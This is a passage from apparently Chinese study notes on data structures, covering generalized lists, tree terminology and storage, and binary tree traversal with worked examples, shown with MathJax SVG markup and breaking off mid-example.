data-mml-node="mo" transform="translate(7207.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(7652.3,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(8688.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，其中LS为表名，n为表的长度，每一个<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.937ex" height="1.355ex" role="img" focusable="false" viewBox="0 -441 856 598.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>为表的元素。习惯上，一般用大写字母表示广义表，小写字母表示原子。</p><p>表头：若LS非空(<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex" xmlns="http://www.w3.org/2000/svg" width="5.506ex" height="1.819ex" role="img" focusable="false" viewBox="0 -666 2433.6 804"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(1933.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>)，则其第一个元素<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.185ex" height="1.337ex" role="img" focusable="false" viewBox="0 -441 965.6 591"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>就是表头，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="14.693ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6494.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(576,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1042,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1571,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(2091,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2480,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(3161,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(3806,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4472.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(5528.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>。注：表头可以是原子，也可以是子表。</p><p>表尾：除表头之外的其它元素组成的表，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="22.576ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 9978.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(361,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(890,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1235,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(1533,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1922,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(2603,0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(3248,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3914.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4970.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(5359.6,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(562,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6325.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(6769.8,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(8108.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(8553.1,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(562,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(9589.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。注：表尾不是最后一个元素，而是一个子表。</p><p>广义表可以看成是线性表的推广，线性表是广义表的特例。广义表的结构相当灵活，在某种前提下，它可以兼容线性表、数组、树和有向图等各种常用的数据结构。</p><p>当二维数组的每行(或每列)作为子表处理时，二维数组即为一个广义表。另外，树和有向图也可以用广义表来表示。</p><p>比如操作系统中的“多级目录结构”。</p><h1 id="3-非线性结构"><a href="#3-非线性结构" class="headerlink" title="3. 非线性结构"></a>3. 非线性结构</h1><h2 id="3-1-树"><a href="#3-1-树" class="headerlink" title="3.1 树"></a>3.1 树</h2><p><strong>树的定义</strong></p><ul><li>专业定义：<ol><li>有且只有一个称为根的节点</li><li>有若干个互不相交的子树，这些子树本身也是一颗树</li></ol></li><li>通俗定义：<ol><li>树是由节点和边组成</li><li>每个节点只有一个父节点但可以有多个子节点</li><li>但有一个节点例外，该节点没有父节点，此节点称为根节点</li></ol></li><li>专业术语：<ul><li>节点，父节点，子节点</li><li>子孙，堂兄弟</li><li>深度：从根节点到最底层节点的层数称之为深度，根节点是第一层</li><li>叶子节点：没有子节点的节点</li><li>非终端节点：实际就是非叶子节点</li><li>度：子节点的个数</li></ul></li></ul><p><strong>树的分类</strong></p><ul><li>一般树：任意一个节点的子节点的个数都不受限制</li><li>二叉树：任意一个节点的子节点个数最多两个，且子节点的位置不可更改<ul><li>分类<ul><li>一般二叉树</li><li>满二叉树：在不增加树层数的前提下，无法再多添加一个节点的二叉树就是满二叉树</li><li>完全二叉树：如果只是删除了满二叉树最底层最右边的连续若干个节点，这样形成的二叉树就是完全二叉树。（满二叉树是完全二叉树的一个特例）</li></ul></li></ul></li><li>森林：n个互不相交的树的集合</li></ul><p><strong>树的存储</strong></p><ul><li><p>二叉树的存储</p><ul><li><p>连续存储【完全二叉树】</p><blockquote><p>优点：查找某个节点的父节点和子节点（也包括判断有没有子节点）速度很快</p><p>缺点：耗用内存空间过大</p></blockquote></li><li><p>链式存储</p></li></ul></li><li><p>一般树的存储</p><ul><li><p>双亲表示法：求父节点方便</p></li><li><p>孩子表示法：求子节点方便</p></li><li><p>双亲孩子表示法：求父节点和子节点都很方便</p></li><li><p>二叉树表示法：把一个普通树转化成二叉树来存储</p><blockquote><p>具体转换方法：</p><p>设法保证任意一个节点的左指针域指向它的第一个孩子，右指针域指向它的亲兄弟，只要满足此条件，就可以把一个普通树转化为二叉树。</p><p>一个普通树转化成的二叉树一定没有右子树。</p></blockquote></li></ul></li><li><p>森林的存储</p><blockquote><p>先把森林转化为二叉树，再存储二叉树：</p><p>将相邻的父节点依次作为节点的右子树再对各父节点进行转化</p></blockquote></li></ul><p><strong>树的操作</strong></p><ul><li><p>遍历</p><ul><li><p>先序遍历【先访问根节点】</p><blockquote><ol><li><p>先访问根节点</p></li><li><p>再先序访问左子树</p></li><li><p>最后先序访问右子树</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      A </span><br><span class="line">     / \</span><br><span class="line">    B   C</span><br><span class="line">   / \   \</span><br><span class="line">  D   E    F</span><br><span class="line"> / \   \  / \ </span><br><span class="line">G   H   I J  k</span><br></pre></td></tr></table></figure><p>先序遍历结果：ABDGHEICFJK</p></li></ol></blockquote></li><li><p>中序遍历【中间访问根节点】</p><blockquote><ol><li><p>中序遍历左子树</p></li><li><p>再访问根节点</p></li><li><p>再中序遍历右子树</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      A </span><br><span class="line">     / \</span><br><span class="line">    B   C</span><br><span class="line">   / \   \</span><br><span class="line">  D   E   F</span><br><span class="line"> / \   \  / \</span><br><span class="line">G   H   I J  k</span><br></pre></td></tr></table></figure><p>中序遍历结果：GDHBEIACJFK</p></li></ol></blockquote></li><li><p>后序遍历【最后访问根节点】</p><blockquote><ol><li><p>先中序遍历左子树</p></li><li><p>再中序遍历右子树</p></li><li><p>最后遍历根节点</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      A</span><br><span class="line">     / \</span><br><span class="line">    B   C</span><br><span class="line">   / \   \</span><br><span class="line">  D   E   F </span><br><span class="line"> / \   \  / \</span><br><span class="line">G   H   I J  k</span><br></pre></td></tr></table></figure><p>后序遍历结果：GHDIEBJKFCA</p></li></ol></blockquote></li></ul></li><li><p>已知两种遍历序列求原始二叉树</p><blockquote><p>通过<strong>先序和中序</strong>或者<strong>中序和后序</strong>我们可以还原出原始二叉树，但是通过先序和后序是无法还原出原始二叉树。</p><p>例子1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 